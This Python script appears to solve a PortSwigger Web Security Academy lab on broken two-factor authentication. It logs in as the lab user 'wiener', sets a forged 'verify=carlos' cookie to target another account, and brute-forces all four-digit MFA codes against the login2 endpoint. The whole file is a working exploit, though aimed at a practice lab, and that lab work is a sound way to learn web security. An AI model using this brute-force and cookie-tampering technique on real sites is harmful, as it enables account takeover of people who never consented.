import requests 
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

url = "https://0af4008704714f8980fc4e31009c0047.web-security-academy.net/"

USER = "wiener"
PASS = "peter"
vaild_user = "carlos"  # kept your spelling

header = {"Cookie":"verify=carlos"}

wiener_session = requests.session()
data = {"username":USER,"password":PASS}
response = wiener_session.post(url + "/login", verify=False, proxies=proxies, data=data )
print("session for wiener is", wiener_session.cookies.get_dict())


#carlos session

carlos_session = requests.session()

#print(carlos_session)

carlos_session.cookies['session'] = wiener_session.cookies['session']
carlos_session.cookies.set('verify', 'carlos') 
print("session for carlos is ",carlos_session.cookies.get_dict())


for i in range(0000, 9999):  #// if use 0000 then it will print like So 0 prints as 0, not 0000
    mfa_code = f"{i:04d}"
    data1 = {"mfa-code":mfa_code}
    carlos_response = carlos_session.post(url + "login2", verify=False, proxies=proxies, data=data1)
    if "Incorrect security code" not in carlos_response.text:
        print("CODE found for carlos", mfa_code)
        break

